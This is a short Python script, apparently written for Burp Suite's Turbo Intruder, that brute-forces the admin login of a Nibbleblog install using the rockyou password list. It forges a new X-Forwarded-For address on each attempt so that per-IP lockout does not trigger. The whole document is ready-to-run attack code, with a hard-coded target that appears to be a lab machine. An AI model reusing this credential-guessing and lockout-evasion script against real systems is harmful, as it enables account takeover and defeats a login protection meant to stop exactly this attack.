def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False
                           )

    passwords = open('E:\\Ubuntu Shared\\rockyou.txt').read().splitlines()

    for i, password in enumerate(passwords):
        ip_part_3 = i // 256
        ip_part_4 = i % 256
        spoofed_ip = "192.168.%d.%d" % (ip_part_3, ip_part_4)

        body = "username=admin&password=%s" % password
        headers = "POST /nibbleblog/admin.php HTTP/1.1\r\n" \
                  "Host: 10.129.12.163\r\n" \
                  "X-Forwarded-For: %s\r\n" \
                  "Content-Length: %d\r\n" \
                  "Content-Type: application/x-www-form-urlencoded\r\n" \
                  "Cookie: PHPSESSID=tvdj0dise43artbf3b6mdbn2h0\r\n" \
                  "\r\n" \
                  "%s" % (spoofed_ip, len(body), body)

        engine.queue(headers)

def handleResponse(req, interesting):
    if 'Invalid' not in req.response:
        table.add(req)